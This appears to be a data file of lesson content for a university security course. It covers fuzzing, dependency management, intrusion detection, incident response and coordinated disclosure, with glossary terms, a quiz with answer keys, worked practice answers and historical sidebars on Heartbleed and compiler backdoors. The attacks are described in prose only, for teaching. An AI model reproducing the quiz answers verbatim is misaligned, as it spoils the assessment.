<li><strong>Fuzzing</strong>: feed a program huge numbers of automatically generated, malformed inputs and watch for crashes, hangs and sanitizer reports. <em>Coverage-guided</em> fuzzers such as AFL++ and libFuzzer keep any input that reaches new code and mutate it further, so they work their way deep into parsers. Fuzzing found Heartbleed-class bugs by the thousand; Google's OSS-Fuzz service runs it continuously on over a thousand open-source projects. The programming problem builds a tiny fuzzer.</li>
<li><strong>Dependencies</strong>: a typical application runs far more code from libraries than its team wrote, and each library's vulnerabilities are yours. Pin exact versions in a lockfile, so a build is reproducible and an update is a reviewed change; track known vulnerabilities with an advisory scanner (an <em>advisory</em> is a published notice naming the affected versions, such as "below 2.4.3"; versions are usually written major.minor.patch, numbers separated by dots, and the scanner compares yours with the range part by part, as numbers); update promptly (Equifax's breach used a bug patched two months earlier); and be wary of the supply chain itself. In 2024 a maintainer of the widely used compression library xz, who had built trust over about two years, slipped a backdoor targeting SSH servers into its release files; it was caught by chance, by an engineer who noticed logins taking half a second longer than usual.</li>
<li><strong>Secrets management</strong> (CS 240 Lesson 8): keys in a secrets manager, never in the repository; rotated when people leave or anything leaks.</li>
</ul>

<h3>Detection and the base-rate problem</h3>
<p>Defenses fail, so systems also need to notice attacks: logs (CS 240 Lesson 8) of authentication events, permission failures and administrative actions, kept where an intruder can't erase them, and an intrusion detection system that raises alerts. Alerts run into MATH 230 Lesson 1's base-rate problem. Suppose a detector flags 99% of malicious events and wrongly flags 1% of benign ones, and 1 event in 10,000 is malicious. Of a million events, 100 are malicious, of which 99 are flagged, while 1% of the 999,900 benign events, 9,999, are flagged too. So P(malicious | alert) = 99 / (99 + 9,999) ≈ 0.98%. Fewer than one alert in a hundred is real, and analysts who learn to ignore alerts will ignore the real one. Useful detection needs very low false-positive rates, or alerts combined with context.</p>

<h3>Incident response</h3>
<p>An <strong>incident</strong> is a confirmed or suspected compromise. Organizations prepare a plan in advance, because the middle of an incident is the wrong time to decide who is in charge. The usual phases:</p>
<ol>
<li><strong>Preparation</strong>: the plan, contacts, logging, backups that have actually been restored in a test, and practice exercises.</li>
<li><strong>Detection and analysis</strong>: confirm what happened, its scope, and when it began, preserving evidence (copies of disks and logs) before changing anything.</li>
<li><strong>Containment</strong>: stop the spread: isolate machines, disable accounts, revoke and rotate keys and sessions that may be exposed.</li>
<li><strong>Eradication and recovery</strong>: remove the attacker's access (rebuilding machines from known-good images rather than trusting a cleanup), fix the vulnerability, restore service, and watch for the attacker's return.</li>
<li><strong>Lessons learned</strong>: a blameless postmortem (CS 240 Lesson 8) with action items.</li>
</ol>
<p>Many laws, such as the EU's GDPR (CS 100 Lesson 4), require notifying regulators and affected people within set times after a breach of personal data, so legal and communications staff are part of the plan.</p>

<h3>Responsible disclosure</h3>
<p>What should you do if you find a vulnerability in someone else's software? The accepted practice is <strong>coordinated disclosure</strong>: report it privately to the vendor (through its security contact, often listed in a <code>security.txt</code> file on its website, or its bug bounty program), give them a reasonable time to fix it, and publish details only after a fix is available or the deadline passes. Google's Project Zero, for example, uses a 90-day deadline. Vulnerabilities get identifiers from the CVE (Common Vulnerabilities and Exposures) system, so that advisories, scanners and patches can refer to the same bug. Many companies run <strong>bug bounty</strong> programs that pay for reports and state what testing is permitted. On the other side of the fence, if you maintain software, publish a security contact, acknowledge reports quickly, and don't threaten the people who send them. The sidebar covers the legal line that all of this sits on: authorization.</p>
<p class="note">Why it matters: secure systems come from habits applied every week (threat models, review, fuzzing, updates, logs, rehearsed plans) at least as much as from clever mechanisms.</p>
`,
      terms: [
        ["Network adversary", "An attacker who can read, modify, drop, replay and inject network traffic."],
        ["Firewall", "A device or program that allows or blocks traffic at a network boundary according to rules."],
        ["Stateful firewall", "A firewall that tracks connections, so that it can allow replies while blocking new inbound connections."],
        ["Segmentation", "Dividing a network into zones separated by filtering, to limit how far an intruder can move."],
        ["Zero trust", "Authenticating and authorizing every request regardless of the network it comes from."],
        ["VPN", "Virtual private network: an encrypted, authenticated tunnel between a device or site and a remote network."],
        ["Metadata", "Information about communication, such as who talked to whom, when and how much, which encryption often doesn't hide."],
        ["Fuzzing", "Testing with large numbers of automatically generated or mutated inputs to find crashes and hangs."],
        ["Coverage-guided fuzzing", "Fuzzing that keeps inputs reaching new code and mutates them further."],
        ["Lockfile", "A file recording the exact versions of every dependency, so that builds are reproducible and updates deliberate."],
        ["Supply-chain attack", "Compromising software by attacking something it is built from, such as a dependency or a build tool."],
        ["Intrusion detection system", "A system that analyses events or traffic and raises alerts on signs of attack."],
        ["Incident response", "The planned process of detecting, containing, eradicating and recovering from a compromise, and learning from it."],
        ["Coordinated disclosure", "Reporting a vulnerability privately to the vendor and publishing only after a fix or an agreed deadline."],
        ["CVE", "Common Vulnerabilities and Exposures: the public catalogue of identifiers for known vulnerabilities."]
      ],
      quiz: [
        { q: "A firewall's rules are checked in order and the first match decides. What should the last rule be?", choices: ["Allow everything", "Deny everything", "Log everything", "It doesn't matter"], answer: 1, why: "A default deny means that anything the rules forgot is blocked." },
        { q: "Which does TLS protect against a network eavesdropper?", choices: ["The IP addresses of both ends", "The sizes and timing of messages", "The content of the messages", "Whether the site is a phishing site"], answer: 2, why: "TLS encrypts and authenticates content; metadata and the honesty of the server are outside its guarantees." },
        { q: "What makes a fuzzer coverage-guided?", choices: ["It covers every input", "It keeps inputs that reach new code and mutates them further", "It reads the source code", "It runs only on covered lines"], answer: 1, why: "Feedback from coverage lets it explore deeper paths step by step." },
        { q: "An intrusion detector catches 99% of attacks with a 1% false-positive rate, and 1 event in 10,000 is an attack. Roughly what fraction of alerts are real?", choices: ["99%", "50%", "About 1%", "0.01%"], answer: 2, why: "99 true alerts against about 9,999 false ones per million events: about 0.98%." },
        { q: "During an incident, why preserve disk images and logs before cleaning up?", choices: ["For backups", "To understand the scope and entry point, and as evidence, which cleanup would destroy", "It is faster", "To restore from them"], answer: 1, why: "Analysis and any later legal process need the evidence intact." },
        { q: "You find a vulnerability in a company's website while using it normally. What is the accepted course of action?", choices: ["Publish it immediately so users know", "Test it further to see how much data you can get", "Report it privately to the company's security contact and allow time for a fix", "Sell it"], answer: 2, why: "Coordinated disclosure; further testing without permission may be unauthorized access." }
      ],
      practice: [
        {
          q: `<p>Write rules for a stateless packet filter protecting a web server: anyone may connect to TCP 443; only the office network 192.0.2.0/24 may use SSH (TCP 22); one known abusive network, 198.51.100.0/24, is blocked entirely; everything else is denied. Give the rules in order and say what goes wrong if the block rule comes last.</p>`,
          a: `<p>(1) deny any from 198.51.100.0/24, all ports; (2) allow tcp from 0.0.0.0/0 to port 443; (3) allow tcp from 192.0.2.0/24 to port 22; (4) deny everything (the default). With first-match semantics, if the block came after rule 2, the abusive network's HTTPS traffic would match rule 2 first and be allowed: the block would be <em>shadowed</em> for port 443, a mistake the programming problem detects. A stateless filter on the server also needs rules for the server's own outgoing traffic and replies, which is one reason stateful firewalls are the norm.</p>`
        },
        {
          q: `<p>Your project depends on a library at version 2.4.1. An advisory says versions below 2.4.3 have a remote code execution bug, fixed in 2.4.3. Describe what you would do, in order, and why a lockfile helps. Why is comparing versions as strings wrong?</p>`,
          a: `<p>Confirm you are affected (the lockfile shows exactly which version is deployed, including when the library comes in indirectly through another dependency), check whether the vulnerable feature is reachable in your use, update to 2.4.3 in a reviewed change that runs the full test suite, deploy, and, if the bug may have been exploited, check logs for signs of it (incident response). The lockfile makes the deployed version known and the update a deliberate, reviewable change rather than whatever the package index served that day. String comparison is wrong because <code>"2.10.0" &lt; "2.9.0"</code> as strings (the character "1" sorts before "9"); compare tuples of integers, <code>(2, 10, 0) &gt; (2, 9, 0)</code>.</p>`
        },
        {
          q: `<p>An employee's laptop shows signs of malware that has been sending data to an unknown server for a week. List the first five things the response team should do, in order, with a reason for each.</p>`,
          a: `<p>(1) Activate the incident plan and name an incident lead, so decisions and communication are coordinated. (2) Contain: disconnect the laptop from the network (but don't power it off, which would lose memory contents), and block the unknown server at the firewall. (3) Preserve evidence: image the disk and memory and collect firewall and proxy logs for the week, to learn what was sent. (4) Revoke the employee's credentials and sessions and rotate any keys or passwords the laptop held, since the malware may have taken them. (5) Scope: search logs for the same server or indicators on other machines, because one infected laptop is often not the only one. Then eradicate (rebuild the laptop), recover, notify if personal data left, and hold a blameless postmortem.</p>`
        },
        {
          q: `<p>A friend shows you a script that tries common passwords against the login page of your university's course system, "just to check it's secure". Using the sidebar, explain the legal and ethical problem and what they should do instead.</p>`,
          a: `<p>They have no authorization to test the system, and guessing other people's passwords is attempting to access accounts that aren't theirs: under laws like the US Computer Fraud and Abuse Act or the UK Computer Misuse Act, that can be a crime regardless of intent, and it is certainly a violation of the university's rules. It may also lock out real students or trigger an incident response. Good intentions don't create permission. Instead: report the concern (for example, "the login page doesn't seem to limit attempts") to the university's IT security contact without testing it, or ask whether there is a bug bounty or authorized testing program with stated rules. To practise, use systems they own or deliberately vulnerable training environments, such as this course's virtual machine.</p>`
        }
      ],
      sources: ["anderson20", "certcvd", "xzcve", "owaspcs"]
    }
  ]
});

CSA.addAsides("cs380", {
  sc2: [
    { kind: "history", title: "Venona: a pad used twice", html: `<p>During the Second World War, Soviet intelligence agencies encrypted their cables with one-time pads: a codebook turned words into groups of digits, and digits from a pad page were added to them, a decimal version of the XOR in these notes. Used correctly, the system was unbreakable. But in 1942, under wartime pressure, the office that produced the pads printed tens of thousands of duplicate pages, and the copies were distributed to different users. In February 1943 the U.S. Army's Signal Intelligence Service at Arlington Hall, Virginia, began studying Soviet diplomatic traffic, a project later code-named Venona; its analysts noticed that some key pages had been used twice, and by matching messages enciphered with the same pages they could start to strip the key away, exactly as two-time-pad analysis does. The work was slow, partial and went on for decades: only a fraction of the messages were ever read, many only in part. Those that were revealed Soviet espionage in the United States and Britain, including agents in the atomic bomb project. The National Security Agency made about 3,000 translated messages public in 1995 and 1996. The mathematics of the one-time pad never failed; its key management did.</p>`, sources: ["venona"] }
  ],
  sc5: [
    { kind: "practice", title: "Heartbleed", html: `<p>TLS has a small "heartbeat" extension: one side sends a message containing some bytes and their length, and the other echoes the bytes back to show the connection is alive. In OpenSSL, the library behind a large share of the web's HTTPS servers, the code that answered a heartbeat trusted the length field in the request. A request could carry 1 byte of data but claim 65,535, and the server would copy 65,535 bytes starting at the data, sending back up to 64 KB of whatever lay next to it in the server's memory: other users' requests, session cookies, passwords and, as researchers soon demonstrated, the server's private TLS key. Nothing was logged, and the attack could be repeated indefinitely. The bug, CVE-2014-0160, entered OpenSSL in a release of March 2012 and was disclosed in April 2014, found independently by a Google researcher and by engineers at the security company Codenomicon. The fix was a few lines: discard any heartbeat whose claimed length exceeds the data actually received. Administrators then had to patch, replace their certificates and keys (since the old private keys might have leaked), and ask users to change passwords. Heartbleed also exposed how few people were paid to maintain software the whole internet depended on, which led to new funding for critical open-source projects.</p>`, sources: ["heartbleed"] }
  ],
  sc8: [
    { kind: "history", title: "Reflections on trusting trust", html: `<p>In "Reflections on Trusting Trust", the lecture he gave on receiving the 1983 Turing Award (published in <em>Communications of the ACM</em> in August 1984), Ken Thompson, co-creator of Unix, described an attack on the tools programmers trust most. Modify the C compiler so that when it compiles the <code>login</code> program, it inserts a backdoor accepting a secret password for any account. Reviewing <code>login</code>'s source would reveal nothing. Then modify the compiler a second time, so that when it compiles <em>the compiler itself</em>, it inserts both modifications into the result. Compile once, and remove the changes from the compiler's source. Every later compiler built from the clean source by the infected binary is infected too, and no source code anywhere shows it. His moral: "You can't trust code that you did not totally create yourself", and the problem reaches down through assemblers, loaders and microcode. The lecture is the founding text of supply-chain security. Partial answers came decades later: <em>reproducible builds</em>, in which independent parties compile the same source and check that they get bit-for-bit identical binaries, and David A. Wheeler's <em>diverse double-compiling</em>, which uses a second, independent compiler to detect a compiler that reproduces itself dishonestly.</p>`, sources: ["thompson84"] },
    { kind: "ethics", title: "Authorization, the law and security work", html: `<p>The same action, guessing a password or sending a crafted request, is a security test when the owner has authorized it and a crime when they haven't. In the United States the Computer Fraud and Abuse Act (1986) makes it an offence to access a computer "without authorization" or to "exceed authorized access"; Robert Morris's 1988 worm (CS 210 Lesson 6) brought its first conviction. For decades courts disagreed about whether breaking a website's terms of use, or using legitimately accessible data for an improper purpose, counted. In <em>Van Buren v. United States</em> (2021) the Supreme Court read the law narrowly: it covers entering parts of a system (files, folders, databases) that are off-limits to you, not misusing information you were entitled to reach. In 2022 the Justice Department also told prosecutors not to charge good-faith security research. The United Kingdom's Computer Misuse Act (1990) makes unauthorized access an offence, with heavier penalties for access with intent to commit further crimes and for acts that impair a system, and has no general exception for research; many other countries have similar laws. None of this makes testing without permission safe. The ethical standard is clearer than the law: the ACM Code of Ethics, introduced in CS 100 Lesson 3, says in a further principle (2.8) to access computing resources only when authorized or when compelled by the public good. In practice that means written permission with an agreed scope before testing anything you don't own, stopping and reporting as soon as you find something rather than seeing how far it goes, touching no more personal data than is needed to demonstrate the problem, and coordinated disclosure afterwards.</p>`, sources: ["vanburen21", "cma1990", "acm"] }
  ]
});
